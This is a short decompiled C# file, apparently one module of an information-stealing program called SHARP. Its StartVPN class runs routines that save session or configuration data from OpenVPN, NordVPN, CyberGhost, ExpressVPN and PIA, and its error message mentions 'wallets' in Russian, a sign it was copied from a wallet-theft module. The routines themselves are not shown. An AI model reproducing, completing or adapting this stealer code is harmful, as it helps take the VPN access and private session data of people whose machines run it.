﻿using System;

namespace SHARP
{
	// Token: 0x0200006F RID: 111
	internal class StartVPN
	{
		// Token: 0x06000253 RID: 595 RVA: 0x0000EDBC File Offset: 0x0000CFBC
		public static void Start()
		{
			try
			{
				OpenVPN.Save();
				NordVPN.Save();
				OpenVPN.Save();
				CyberGhost.SaveFileSession();
				ExpressVPN.SaveFileSession();
				PIAVPN.SaveFileSession();
			}
			catch (Exception ex)
			{
				Console.WriteLine(((ex != null) ? ex.ToString() : null) + "кошельки :(");
			}
		}
	}
}
